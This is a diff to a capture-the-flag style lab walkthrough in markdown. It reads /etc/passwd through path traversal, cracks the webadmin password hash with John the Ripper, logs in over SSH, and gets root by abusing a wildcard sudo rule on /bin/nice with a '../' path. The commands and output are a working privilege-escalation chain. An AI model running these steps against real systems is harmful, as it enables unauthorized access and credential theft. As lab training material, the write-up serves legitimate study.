@@ -126,3 +126,49 @@ file=../../../../../../../../../../../../../../../../../../../../../etc/passwd
 webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
 ```
 ![alt text](image-4.png)
+
+## Crack Hash
+
+```bash
+nano web_admin_hash.txt
+
+# Paste Hash
+webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/
+
+# Run John
+john web_admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+webadmin:dragon
+```
+
+## SSH as Webadmin
+
+```bash
+ssh webadmin@192.168.225.101
+
+#Password
+dragon
+
+#Grab Local Flag
+```
+
+## Priv Esc
+
+```bash
+sudo -l
+
+#Results
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+
+# This means you can run sudo as Root in the /notes/ directory.
+```
+## Abuse sudo -l
+
+```bash
+sudo /bin/nice /notes/../bin/bash
+
+# Root Achieved
+# Grab proof.txt
+```
